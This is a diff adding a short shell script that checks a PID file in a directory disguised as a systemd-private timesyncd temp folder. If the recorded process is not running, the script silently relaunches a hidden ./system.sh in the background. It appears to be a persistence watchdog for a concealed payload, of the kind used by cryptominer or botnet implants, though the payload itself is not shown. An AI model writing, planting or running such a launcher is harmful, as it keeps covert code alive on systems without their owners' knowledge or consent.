@@ -1,0 +1,10 @@
+#!/bin/sh
+if test -r /var/tmp/systemd-private-225dbf0c0db04c779eaa37643fb99602-systemd-timesyncd.service-8HImcR/tmp/system.pid; then
+pid=$(cat /var/tmp/systemd-private-225dbf0c0db04c779eaa37643fb99602-systemd-timesyncd.service-8HImcR/tmp/system.pid)
+if $(kill -CHLD $pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+cd /var/tmp/systemd-private-225dbf0c0db04c779eaa37643fb99602-systemd-timesyncd.service-8HImcR/tmp
+./system.sh &>/dev/null
